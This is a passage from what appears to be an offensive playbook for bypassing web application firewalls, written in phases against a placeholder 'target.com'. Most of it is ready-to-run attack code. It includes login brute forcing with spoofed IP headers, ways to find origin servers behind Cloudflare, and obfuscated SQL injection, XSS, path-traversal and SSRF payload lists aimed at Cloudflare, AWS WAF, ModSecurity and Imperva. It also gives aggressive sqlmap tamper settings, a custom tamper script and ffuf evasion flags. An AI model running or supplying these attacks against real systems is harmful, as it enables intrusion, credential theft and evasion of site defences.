import socket, ssl

HOST = "target.com"
PORT = 443

# Send two requests pipelined — WAF may only inspect first
req1 = (
    "GET / HTTP/1.1\r\n"
    f"Host: {HOST}\r\n"
    "Connection: keep-alive\r\n"
    "\r\n"
)
req2 = (
    "GET /?id=1'+OR+1=1-- HTTP/1.1\r\n"
    f"Host: {HOST}\r\n"
    "Connection: close\r\n"
    "\r\n"
)
ctx = ssl.create_default_context()
ctx.check_hostname = False
ctx.verify_mode = ssl.CERT_NONE
with socket.create_connection((HOST, PORT)) as s:
    with ctx.wrap_socket(s, server_hostname=HOST) as ss:
        ss.sendall((req1 + req2).encode())
        import time; time.sleep(1)
        print(ss.recv(8192).decode(errors='replace')[:1000])
PYEOF
```

## PHASE 9 — RATE LIMIT BYPASS

```bash
TARGET_URL="https://target.com/api/login"

# Rate limit bypass techniques

# 1. IP rotation via X-Forwarded-For
python3 << 'PYEOF'
import requests, random, string

TARGET = "https://target.com/api/login"

def random_ip():
    return f"{random.randint(1,254)}.{random.randint(0,255)}.{random.randint(0,255)}.{random.randint(1,254)}"

passwords = ["password", "123456", "admin", "Password1", "welcome"]

for pwd in passwords:
    ip = random_ip()
    headers = {
        "X-Forwarded-For": ip,
        "X-Real-IP": ip,
        "Content-Type": "application/json"
    }
    r = requests.post(TARGET, json={"email": "admin@target.com", "password": pwd}, headers=headers)
    print(f"{pwd} (IP: {ip}) -> HTTP {r.status_code}: {r.text[:80]}")
PYEOF

# 2. Null byte in password (may bypass rate limit per-value checks)
curl -s -X POST "$TARGET_URL" \
  -H "Content-Type: application/json" \
  -d '{"email":"admin@target.com","password":"admin\u0000extra"}' | tee rate_nullbyte.txt

# 3. Case variation in email
for email in "admin@target.com" "Admin@target.com" "ADMIN@target.com" \
  "aDmIn@target.com" "admin+tag@target.com" "admin@TARGET.COM"; do
  curl -s -X POST "$TARGET_URL" \
    -H "Content-Type: application/json" \
    -d "{\"email\":\"$email\",\"password\":\"test123\"}" | tee -a rate_email_case.txt
done

# 4. Padding/extra fields bypass
curl -s -X POST "$TARGET_URL" \
  -H "Content-Type: application/json" \
  -d '{"email":"admin@target.com","password":"test","padding":"'$(python3 -c "print('A'*1000))"'"}' | tee rate_padding.txt

# 5. Different endpoint paths for same functionality
for path in /api/login /api/v1/login /api/v2/login /auth/login /api/signin \
  /api/authenticate /api/session /api/token /oauth/token; do
  STATUS=$(curl -so /dev/null -w "%{http_code}" -X POST "${TARGET_URL%/login}${path}" \
    -H "Content-Type: application/json" \
    -d '{"email":"admin@target.com","password":"test123"}')
  [ "$STATUS" != "404" ] && [ "$STATUS" != "000" ] && \
    echo "$path -> HTTP $STATUS" | tee -a rate_alt_paths.txt
done
```

## PHASE 10 — CLOUDFLARE-SPECIFIC BYPASS

```bash
TARGET_DOMAIN="target.com"

# Method 1: Find origin IP (see Phase 2)
# Method 2: Access via direct IP with Host header
ORIGIN_IP="DISCOVERED_ORIGIN_IP"
curl -sk "https://$ORIGIN_IP/" -H "Host: $TARGET_DOMAIN" | head -20 | tee cf_bypass_direct.txt
# Attack via direct IP — bypasses Cloudflare entirely
curl -sk "https://$ORIGIN_IP/?id=1' OR 1=1--" -H "Host: $TARGET_DOMAIN" | tee cf_bypass_sqli.txt

# Method 3: Cloudflare Workers might have different rules than main app
for cf_path in /cdn-cgi/ /cdn-cgi/trace /cdn-cgi/challenge-platform; do
  STATUS=$(curl -so /dev/null -w "%{http_code}" "https://$TARGET_DOMAIN$cf_path")
  echo "$cf_path -> HTTP $STATUS" | tee -a cf_workers.txt
done

# Method 4: Cloudflare bypass via old/alternative hostnames
for alt in "www.$TARGET_DOMAIN" "direct.$TARGET_DOMAIN" "origin.$TARGET_DOMAIN" \
  "backend.$TARGET_DOMAIN" "api.$TARGET_DOMAIN" "app.$TARGET_DOMAIN"; do
  IP=$(dig +short $alt A 2>/dev/null | head -1)
  [ -n "$IP" ] && echo "$alt -> $IP" | tee -a cf_alt_hosts.txt
done

# Method 5: Payload obfuscation for Cloudflare's ruleset
CF_BYPASSES=(
  "1/**/OR/**/1=1--"
  "1/*!OR*/1=1--"
  "1%0aOR%0a1%3D1--"
  "1\tOR\t1=1--"
  "1%0bOR%0b1=1--"
  "1/*!50000OR*/1=1--"
  "1+OR+1+%3D+1--"
)
for payload in "${CF_BYPASSES[@]}"; do
  ENC=$(python3 -c "import urllib.parse; print(urllib.parse.quote('$payload'))" 2>/dev/null)
  STATUS=$(curl -so /dev/null -w "%{http_code}" "https://$TARGET_DOMAIN/?id=$ENC" \
    -H "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36")
  echo "$STATUS <- $payload" | tee -a cf_sqli_bypass.txt
done

# Method 6: Cloudflare challenge bypass detection
# Look for cf_clearance cookie requirement
curl -sI "https://$TARGET_DOMAIN/?id=1' OR 1=1--" | grep -i "cf-chl\|cf_clearance\|403\|challenge" | tee cf_challenge.txt
```

## PHASE 11 — AWS WAF BYPASS

```bash
TARGET_URL="https://target.com"

# AWS WAF uses managed rule groups — identify which are enabled
# Test common AWS managed rule triggers
curl -s "${TARGET_URL}?id=1 UNION SELECT 1,2,3--" -H "User-Agent: sqlmap" | tee aws_waf_test.txt
curl -s "${TARGET_URL}?id=../../../etc/passwd" | tee aws_waf_lfi.txt

# AWS WAF SQLi bypass
AWS_SQLI_BYPASSES=(
  "1/**/UNION/**/SELECT/**/1,2,3--"
  "1 UNION%23%0aSELECT 1,2,3--"
  "1%0aUNION%0aSELECT%0a1,2,3--"
  "1/*!UNION*//*!SELECT*/1,2,3--"
  "1 UniOn SeLeCt 1,2,3--"
  "1 union(select(1),(2),(3))--"
)

for payload in "${AWS_SQLI_BYPASSES[@]}"; do
  STATUS=$(curl -so /dev/null -w "%{http_code}" "${TARGET_URL}?id=$payload")
  echo "$STATUS <- $payload" | tee -a aws_waf_bypass.txt
done

# AWS WAF LFI bypass
AWS_LFI_BYPASSES=(
  "..%2F..%2F..%2Fetc%2Fpasswd"
  "..%252F..%252F..%252Fetc%252Fpasswd"
  "....//....//etc/passwd"
  "..;/etc/passwd"
  "%2e%2e%2fetc%2fpasswd"
)

for payload in "${AWS_LFI_BYPASSES[@]}"; do
  STATUS=$(curl -so /dev/null -w "%{http_code}" "${TARGET_URL}/download?file=$payload")
  echo "$STATUS <- $payload" | tee -a aws_lfi_bypass.txt
done

# AWS WAF XSS bypass — HTML encoder + comment injection
curl -s "${TARGET_URL}?q=<script>alert(1)</script>" -H "User-Agent: Mozilla/5.0" | tee aws_xss_test.txt
curl -s "${TARGET_URL}?q=%3Cscript%3Ealert%281%29%3C%2Fscript%3E" | tee aws_xss_enc.txt
curl -s "${TARGET_URL}?q=<img/**/src=x/**/onerror=alert(1)>" | tee aws_xss_comment.txt
```

## PHASE 12 — MODSECURITY CRS BYPASS

```bash
TARGET_URL="https://target.com"

# Paranoia Level 1 (default) bypasses
PL1_BYPASSES=(
  # PL1 allows these
  "1 OR sleep(5)--"
  "1 UNION SELECT version()--"
  "<script>alert(1)</script>"
)

# Paranoia Level 2 bypasses
PL2_BYPASSES=(
  "1/**/OR/**/sleep(5)--"
  "1%0aOR%0asleep(5)--"
  "<ScRiPt>alert(1)</ScRiPt>"
  "<img/src=x/onerror=alert(1)>"
)

# Paranoia Level 3 bypasses (very strict)
PL3_BYPASSES=(
  "1/*!50000OR*/1=1--"
  "<svg onload=eval(atob('YWxlcnQoMSk='))>"
  # base64-encoded alert(1) = YWxlcnQoMSk=
)

# Paranoia Level 4 (strictest)
PL4_BYPASSES=(
  # PL4 blocks nearly everything — need OOB, timing, or direct IP
  "1;SELECT SLEEP(5)--"
)

# Test each set
for payload in "${PL1_BYPASSES[@]}" "${PL2_BYPASSES[@]}"; do
  STATUS=$(curl -so /dev/null -w "%{http_code}" "${TARGET_URL}?id=$(python3 -c "import urllib.parse; print(urllib.parse.quote('$payload'))" 2>/dev/null)")
  echo "$STATUS <- $payload" | tee -a modsec_bypass.txt
done

# ModSecurity rule bypass via multipart/form-data
curl -s -X POST "$TARGET_URL/api/search" \
  -F "query=1' OR 1=1--" \
  -F "extra=test" | tee modsec_multipart.txt

# ModSecurity bypass via Content-Type trick
curl -s -X POST "$TARGET_URL/api/search" \
  -H "Content-Type: application/x-www-form-urlencoded; charset=ibm037" \
  --data "query=1' OR 1=1--" | tee modsec_charset.txt

# ModSecurity PCRE limit bypass (very long payload to exhaust regex)
PADDING=$(python3 -c "print('A'*10000)")
curl -s "${TARGET_URL}?padding=$PADDING&id=1' OR 1=1--" | tee modsec_pcre_bypass.txt
```

## PHASE 13 — IMPERVA/INCAPSULA BYPASS

```bash
TARGET_URL="https://target.com"

# Imperva relies heavily on reputation + signature matching
# Strategy: make payload look legitimate

# JavaScript encoding
IMPERVA_XSS=(
  "<img src=x onerror=eval(String.fromCharCode(97,108,101,114,116,40,49,41))>"
  "<script>eval(atob('YWxlcnQoMSk='))</script>"
  "<svg onload=setTimeout`alert\x281\x29`>"
  "<script>window['al'+'ert'](1)</script>"
  "<script>window['\x61\x6c\x65\x72\x74'](1)</script>"
)

for payload in "${IMPERVA_XSS[@]}"; do
  ENC=$(python3 -c "import urllib.parse; print(urllib.parse.quote('$payload'))" 2>/dev/null)
  STATUS=$(curl -so /dev/null -w "%{http_code}" "${TARGET_URL}?q=$ENC" \
    -H "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36" \
    -H "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8" \
    -H "Accept-Language: en-US,en;q=0.5" \
    -H "Accept-Encoding: gzip, deflate, br")
  echo "$STATUS <- ${payload:0:60}" | tee -a imperva_bypass.txt
done

# Imperva cookie bypass — send incap_ses cookie
INCAP_COOKIE=$(curl -sc /dev/null -o /dev/null -w "%{http_code}" $TARGET_URL 2>/dev/null)
curl -s "$TARGET_URL/?id=1' OR 1=1--" \
  -b "incap_ses_test=test; visid_incap_test=test" | tee imperva_cookie.txt

# Slow HTTP evasion (send payload slowly)
python3 << 'PYEOF'
import socket, ssl, time

HOST = "target.com"
PAYLOAD = "1' OR '1'='1"
# Send headers slowly — evade rate-based analysis
req_parts = [
    f"GET /?id={PAYLOAD} HTTP/1.1\r\n",
    f"Host: {HOST}\r\n",
    "User-Agent: Mozilla/5.0\r\n",
    "Connection: close\r\n",
    "\r\n"
]
ctx = ssl.create_default_context()
ctx.check_hostname = False
ctx.verify_mode = ssl.CERT_NONE
with socket.create_connection((HOST, 443)) as s:
    with ctx.wrap_socket(s, server_hostname=HOST) as ss:
        for part in req_parts:
            ss.sendall(part.encode())
            time.sleep(0.5)  # slow send
        print(ss.recv(4096).decode(errors='replace')[:500])
PYEOF
```

## PHASE 14 — UNICODE AND ENCODING BYPASS

```bash
TARGET_URL="https://target.com"

# Double URL encoding
python3 << 'PYEOF'
import urllib.parse

payloads = {
    "SQLi": "1' OR '1'='1",
    "XSS": "<script>alert(1)</script>",
    "LFI": "../../../../etc/passwd",
    "CMD": "; id",
}

for name, payload in payloads.items():
    enc1 = urllib.parse.quote(payload)
    enc2 = urllib.parse.quote(enc1)
    enc3 = urllib.parse.quote(enc2)
    # Overlong UTF-8
    print(f"\n=== {name} ===")
    print(f"Single:  {enc1}")
    print(f"Double:  {enc2}")
    print(f"Triple:  {enc3}")
PYEOF

# HTML entity encoding
python3 << 'PYEOF'
payload = "<script>alert(1)</script>"
# Decimal entities
dec = ''.join(f'&#{ord(c)};' for c in payload)
# Hex entities
hex_ent = ''.join(f'&#x{ord(c):x};' for c in payload)
# Mixed
mixed = payload.replace('<', '&#60;').replace('>', '&#62;').replace('/', '&#47;')
print(f"Decimal: {dec}")
print(f"Hex:     {hex_ent}")
print(f"Mixed:   {mixed}")
PYEOF

# Unicode fullwidth characters (bypass keyword matching)
python3 << 'PYEOF'
# Fullwidth Latin: ! (FF01) to ~ (FF5E) = ASCII 0x21-0x7E + 0xFEE0
def to_fullwidth(s):
    result = []
    for c in s:
        code = ord(c)
        if 0x21 <= code <= 0x7E:
            result.append(chr(code + 0xFEE0))
        elif c == ' ':
            result.append('\u3000')  # ideographic space
        else:
            result.append(c)
    return ''.join(result)

keywords = ['SELECT', 'UNION', 'script', 'onerror', 'alert', 'OR', 'AND']
for kw in keywords:
    print(f"{kw} -> {to_fullwidth(kw)}")
PYEOF

# Null byte injection
curl -s "${TARGET_URL}?id=1%00'+OR+'1'='1--" | tee null_byte_sqli.txt
curl -s "${TARGET_URL}?file=../../etc/passwd%00.jpg" | tee null_byte_traversal.txt
curl -s "${TARGET_URL}?q=%00<script>alert(1)</script>" | tee null_byte_xss.txt

# Unicode normalization bypass
# ℳail -> Mail (normalization), ＠ -> @, ﹒ -> .
python3 -c "
import unicodedata
# Characters that normalize to dangerous chars
subs = {'s': 'ꜱ', 'e': 'ᴇ', 'l': 'ʟ', 'c': 'ᴄ', 't': 'ᴛ'}
word = 'select'
encoded = ''.join(subs.get(c, c) for c in word)
print(f'Unicode sub for select: {encoded}')
print(f'Normalized back: {unicodedata.normalize(\"NFKC\", encoded)}')
"
```

## PHASE 15 — SQLMAP TAMPER SCRIPTS

```bash
# Complete tamper script reference

# ENCODING TAMPERS
# apostrophemask.py    — ' -> %EF%BC%87 (fullwidth apostrophe)
# apostrophenullencode.py — ' -> %00%27
# base64encode.py      — base64 encode the whole payload
# charencode.py        — URL encode single chars: SELECT -> %53%45%4C%45%43%54
# chardoubleencode.py  — double URL encode: SELECT -> %2553%2545%254C%2545%2543%2554
# charunicodeencode.py — Unicode encode: SELECT -> %u0053%u0045%u004C%u0045%u0043%u0054
# equaltolike.py       — = -> LIKE
# greatest.py          — > -> GREATEST(a,b): bypass > filter
# halfversionedmorekeywords.py — /*!0UNION*/
# htmlencode.py        — HTML entity encode special chars
# ifnull2ifisnull.py   — IFNULL(a,b) -> IF(ISNULL(a),b,a)
# multiplespaces.py    — INSERT multiple spaces
# nonrecursivereplacement.py — double keywords: UNION -> UNUNIONION
# percentage.py        — SELECT -> %S%E%L%E%C%T
# randomcase.py        — SELECT -> SeLeCt
# randomcomments.py    — SELECT -> S/**/E/**/L/**/E/**/C/**/T
# space2comment.py     — spaces -> /**/ 
# space2dash.py        — spaces -> --\n
# space2hash.py        — spaces -> #\n (MySQL only)
# space2mssqlblank.py  — spaces -> random blank chars (%01-%0F)
# space2mssqlhash.py   — spaces -> %23\n (MSSQL)
# space2morehash.py    — spaces -> %23random\n
# space2mysqlblank.py  — spaces -> %09 %0A %0B %0C %0D %A0
# space2mysqldash.py   — spaces -> --\n
# space2plus.py        — spaces -> +
# unmagicquotes.py     — ' -> \' + add GBK char to confuse MySQL
# uppercase.py         — lowercase -> UPPERCASE
# versionedkeywords.py — keyword -> /*!KEYWORD*/
# versionedmorekeywords.py — keyword -> /*!50000KEYWORD*/

# TAMPER COMBINATIONS BY WAF TYPE

# ModSecurity (generic):
MODSEC_TAMPER="space2comment,charencode,greatest,ifnull2ifisnull,randomcase"
sqlmap -u "$TARGET_URL?id=1" --tamper=$MODSEC_TAMPER --batch --level=5 --risk=3

# Cloudflare:
CF_TAMPER="charencode,charunicodeencode,space2comment,uppercase,randomcomments"
sqlmap -u "$TARGET_URL?id=1" --tamper=$CF_TAMPER --batch --level=5 --risk=3

# AWS WAF:
AWS_TAMPER="space2comment,charencode,uppercase,randomcase,multiplespaces"
sqlmap -u "$TARGET_URL?id=1" --tamper=$AWS_TAMPER --batch --level=5 --risk=3

# Imperva:
IMPERVA_TAMPER="randomcase,charencode,space2comment,ifnull2ifisnull,equaltolike"
sqlmap -u "$TARGET_URL?id=1" --tamper=$IMPERVA_TAMPER --batch --level=5 --risk=3

# Generic WAF — aggressive:
GENERIC_TAMPER="apostrophemask,apostrophenullencode,appendnullbyte,base64encode,between,bluecoat,charencode,charunicodeencode,concat2concatws,equaltolike,greatest,halfversionedmorekeywords,ifnull2ifisnull,modsecurityversioned,modsecurityzeroversioned,multiplespaces,nonrecursivereplacement,percentage,randomcase,securesphere,sp_password,space2comment,space2dash,space2hash,space2morehash,space2mysqldash,space2plus,space2randomblank,unionalltounion,unmagicquotes,uppercase,versionedkeywords,versionedmorekeywords,xforwardedfor"
sqlmap -u "$TARGET_URL?id=1" --tamper=$GENERIC_TAMPER --batch --level=5 --risk=3 --random-agent

# sqlmap WAF bypass global options
sqlmap -u "$TARGET_URL?id=1" \
  --tamper=space2comment,charencode,randomcase \
  --delay=2 \
  --timeout=30 \
  --retries=3 \
  --randomize=id \
  --random-agent \
  --skip-waf \
  --level=5 --risk=3 --batch \
  --dbms=mysql \
  --hex \
  --no-cast \
  --technique=BEUSTQ \
  -v 3
```

## PHASE 16 — CUSTOM SQLMAP TAMPER SCRIPT

```python
#!/usr/bin/env python
# tamper/custom_waf_bypass.py
# Usage: sqlmap --tamper=custom_waf_bypass

import re
from lib.core.enums import PRIORITY

__priority__ = PRIORITY.NORMAL

def dependencies():
    pass

def tamper(payload, **kwargs):
    """
    Custom WAF bypass tamper script.
    Applies: random case + inline comments + version comments + space variants
    
    Example:
        Input:  1 UNION SELECT 1,2,3 FROM users WHERE id=1--
        Output: 1/**/UNiOn/*!50000SeLeCt*/1,2,3/**/FrOm/**/users/**/WHeRe/**/id=1--
    """
    if payload:
        # Step 1: Replace spaces with random variant
        import random
        space_variants = ['/**/', '/*!*/', '%09', '%0a', '%0b', '%0c', '%0d', '%a0']
        
        def replace_space(m):
            return random.choice(space_variants)
        
        payload = re.sub(r'\s+', replace_space, payload)
        
        # Step 2: Random case for SQL keywords
        keywords = ['SELECT', 'UNION', 'FROM', 'WHERE', 'AND', 'OR', 'INSERT',
                    'UPDATE', 'DELETE', 'DROP', 'CREATE', 'TABLE', 'INTO', 
                    'HAVING', 'GROUP', 'ORDER', 'BY', 'LIMIT', 'OFFSET',
                    'JOIN', 'ON', 'AS', 'NOT', 'IN', 'LIKE', 'BETWEEN']
        
        for kw in keywords:
            # Random case
            new_kw = ''.join(c.upper() if random.random() > 0.5 else c.lower() for c in kw)
            payload = re.sub(r'\b' + kw + r'\b', new_kw, payload, flags=re.IGNORECASE)
        
        # Step 3: Version comment wrap SELECT
        payload = re.sub(r'\bSELECT\b', '/*!50000SELECT*/', payload, flags=re.IGNORECASE)
        
        # Step 4: Add random comment between keywords
        payload = re.sub(r'\b(UNION)\b', r'\1/**/', payload, flags=re.IGNORECASE)
        
    return payload
```

## PHASE 17 — FFUF WAF BYPASS FLAGS

```bash
TARGET_URL="https://target.com/FUZZ"
WORDLIST="/usr/share/seclists/Discovery/Web-Content/common.txt"

# Basic ffuf with WAF evasion
ffuf -u "$TARGET_URL" -w $WORDLIST \
  -H "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36" \
  -H "X-Forwarded-For: 127.0.0.1" \
  -H "X-Real-IP: 127.0.0.1" \
  -mc 200,204,301,302,307,401,403 \
  -t 10 \
  -p 0.1-0.5 \
  -timeout 10 \
  -c -v | tee ffuf_waf_bypass.txt

# ffuf with random delay and User-Agent rotation
ffuf -u "$TARGET_URL" -w $WORDLIST \
  -H "User-Agent: FUZZ2" -w /usr/share/seclists/Fuzzing/User-Agents/user-agents.txt:FUZZ2 \
  -mc 200,204,301,302 -t 5 -p 0.5-2.0 | tee ffuf_ua_rotate.txt

# ffuf for parameter fuzzing with WAF evasion
ffuf -u "$TARGET_URL/api/search?FUZZ=test" -w /usr/share/seclists/Discovery/Web-Content/burp-parameter-names.txt \
  -H "User-Agent: Mozilla/5.0" \
  -H "Accept: application/json" \
  -mc 200,201 -t 5 -p 0.2 | tee ffuf_params.txt

# ffuf fuzzing for SQLi with bypass payloads
cat > /tmp/sqli_fuzz.txt << 'FUZZLIST'
1'+OR+'1'='1
1/**/OR/**/1=1--
1/*!OR*/1=1--
1%0aOR%0a1=1--
1 UNION/**/SELECT/**/1,2,3--
1'+UNION+SELECT+1,2,3--
FUZZLIST

ffuf -u "${TARGET_URL/FUZZ/}api/products?id=FUZZ" \
  -w /tmp/sqli_fuzz.txt \
  -H "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64)" \
  -mc 200 -t 5 -p 1.0 \
  -fs 0 \
  -ac | tee ffuf_sqli_waf.txt
```

## PHASE 18 — BYPASS DECISION TREE (ASCII)

```
START: Attack is being blocked (403/406/429/503)
                |
                v
    +---------------------------+
    |  Identify WAF vendor      |
    |  (wafw00f, headers,       |
    |   response body)          |
    +---------------------------+
                |
        +-------+-------+
        |               |
   Cloudflare?      ModSec/Other?
        |               |
        v               v
  Find Origin IP   Check Paranoia Level
  (10 methods)     (test with known
        |           bypass set)
        v               |
  Direct IP access?     v
  (Host: target.com)  PL1/2? -> space2comment
        |             PL3/4? -> OOB timing / IP
        |
        v
  Still blocked?
        |
        +---> Try encoding bypass
        |      - URL encode
        |      - Double URL encode
        |      - Unicode (fullwidth)
        |      - HTML entities
        |      - Null byte
        |
        +---> Try HTTP-level bypass
        |      - Chunked encoding
        |      - IP spoofing headers
        |      - Content-Type change
        |      - Method override
        |      - HTTP/2 request
        |      - Slow HTTP
        |
        +---> Try comment/whitespace bypass
        |      - /**/ between keywords
        |      - /*!...*/  version comment
        |      - Newline (%0a, %0d)
        |      - Tab (%09)
        |
        +---> Try case variation
        |      - SeLeCt, uNiOn
        |      - Mixed encoding
        |
        +---> Try keyword bypass
        |      - Double keyword: OORR
        |      - Split with comment: O/**/R
        |      - Alternative operators: LIKE for =
        |
        +---> Try OOB technique
        |      - DNS exfiltration
        |      - Time-based blind
        |      - Burp Collaborator
        |
        +---> Try payload split
               - Split across multiple parameters
               - Use array parameters: id[]=1&id[]=2
               - HPP (HTTP Parameter Pollution)

                    |
                    v
          If all inline bypasses fail:
          +------------------------------+
          | Pivot to different vuln class |
          | - Test other parameters       |
          | - Test other endpoints        |
          | - Switch from SQLi to SSRF    |
          | - Try blind/OOB variants      |
          +------------------------------+
```

## PHASE 19 — WAF BYPASS FOR SPECIFIC VULN CLASSES

```bash
TARGET_URL="https://target.com"

# SSRF bypass through WAF
SSRF_BYPASSES=(
  "http://169.254.169.254/"
  "http://169.254.169.254.nip.io/"
  "http://[::ffff:169.254.169.254]/"
  "http://[::ffff:a9fe:a9fe]/"
  "http://0xA9FEA9FE/"
  "http://2852039166/"          # decimal of 169.254.169.254
  "http://0251.0376.0251.0376/" # octal
  "http://169.254.169.254:80@evil.com/"
  "http://evil.com@169.254.169.254/"
  "http://169.254.169.254%23.evil.com/"
  "http://169.254.169.254%2fevil.com/"
)

for ssrf in "${SSRF_BYPASSES[@]}"; do
  ENC=$(python3 -c "import